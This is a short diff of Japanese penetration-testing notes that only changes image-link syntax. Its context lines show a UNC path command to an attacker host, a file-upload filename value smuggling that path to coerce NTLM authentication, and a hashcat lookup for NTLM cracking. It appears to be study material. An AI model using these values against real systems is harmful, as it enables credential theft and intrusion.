@@ -21,10 +21,10 @@ dir \\192.168.45.167\test
 # 以下のようにファイルアップロードの箇所に挿入できる場合もある
 # filename="\\\\192.168.45.167\test.txt
 ```
-![](../../../../../images/Pasted%20image%2020260429101928.png)
+![[Pasted image 20260429101928.png]]
 
 Kali
-![](../../../../../images/Pasted%20image%2020260429101934.png)
+![[Pasted image 20260429101934.png]]
 ```bash
 hashcat --help | grep -i "ntlm"
 
